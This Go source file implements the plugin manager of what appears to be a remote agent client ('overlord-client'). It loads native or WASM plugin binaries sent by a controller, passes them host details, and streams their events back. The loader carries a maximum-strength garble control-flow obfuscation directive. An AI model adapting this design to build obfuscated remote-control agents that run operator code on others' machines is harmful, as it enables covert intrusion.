package plugins

import (
	"context"
	"encoding/json"
	"errors"
	"log"
	"sync"
	"time"

	"overlord-client/cmd/agent/wire"
)

type Manager struct {
	mu      sync.Mutex
	plugins map[string]*pluginInstance
	writer  wire.Writer
	host    HostInfo
}

type pluginInstance struct {
	id       string
	manifest PluginManifest
	native   PluginRuntime
}

func NewManager(writer wire.Writer, host HostInfo) *Manager {
	return &Manager{
		plugins: make(map[string]*pluginInstance),
		writer:  writer,
		host:    host,
	}
}

func (m *Manager) Load(ctx context.Context, manifest PluginManifest, binary []byte) error {
	//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max
	if len(binary) == 0 {
		return errors.New("empty plugin binary")
	}
	pluginID := manifest.ID
	if pluginID == "" {
		return errors.New("missing plugin id")
	}

	m.mu.Lock()
	if existing, ok := m.plugins[pluginID]; ok {
		existing.native.Close()
		delete(m.plugins, pluginID)
	}
	m.mu.Unlock()

	var np PluginRuntime
	var err error
	if manifest.RuntimeKind == "wasm" || manifest.WASM != "" {
		np, err = loadWASMPlugin(ctx, manifest, binary)
	} else {
		np, err = loadNativePlugin(binary)
	}
	if err != nil {
		return err
	}

	pi := &pluginInstance{
		id:       pluginID,
		manifest: manifest,
		native:   np,
	}

	send := func(event string, payload []byte) {
		var payloadVal interface{}
		if len(payload) > 0 {
			var parsed interface{}
			if json.Unmarshal(payload, &parsed) == nil {
				payloadVal = parsed
			} else {
				payloadVal = string(payload)
			}
		}
		msg := wire.PluginEvent{
			Type:     "plugin_event",
			PluginID: pluginID,
			Event:    event,
			Payload:  payloadVal,
		}
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[panic] plugin event send: %v", r)
				}
			}()
			sendCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel()
			if err := wire.WriteMsg(sendCtx, m.writer, msg); err != nil {
				log.Printf("[plugin] %s send event error: %v", pluginID, err)
			}
		}()
	}

	hostJSON, err := json.Marshal(m.host)
	if err != nil {
		np.Close()
		return err
	}

	if err := np.Load(send, hostJSON); err != nil {
		np.Close()
		return err
	}

	m.mu.Lock()
	m.plugins[pluginID] = pi
	m.mu.Unlock()

	rt := np.Runtime()
	freeable := rt != "go"
	log.Printf("[plugin] loaded %s (runtime=%s, freeable=%v)", pluginID, rt, freeable)
	return nil
}

func (m *Manager) Dispatch(ctx context.Context, pluginId, event string, payload interface{}) error {
	m.mu.Lock()
	pi := m.plugins[pluginId]
	m.mu.Unlock()
	if pi == nil {
		return nil
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	return pi.native.Event(event, data)
}

func (m *Manager) Close() {
	m.mu.Lock()
	defer m.mu.Unlock()
	for id, pi := range m.plugins {
		rt := pi.native.Runtime()
		pi.native.Close()
		delete(m.plugins, id)
		if rt != "go" {
			log.Printf("[plugin] unloaded %s (runtime=%s, memory freed)", id, rt)
		} else {
			log.Printf("[plugin] unloaded %s (runtime=go, memory leaked — see golang/go#11100)", id)
		}
	}
}

func (m *Manager) Unload(pluginId string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if pi, ok := m.plugins[pluginId]; ok {
		rt := pi.native.Runtime()
		pi.native.Close()
		delete(m.plugins, pluginId)
		if rt != "go" {
			log.Printf("[plugin] unloaded %s (runtime=%s, memory freed)", pluginId, rt)
		} else {
			log.Printf("[plugin] unloaded %s (runtime=go, memory leaked — see golang/go#11100)", pluginId)
		}
	}
}
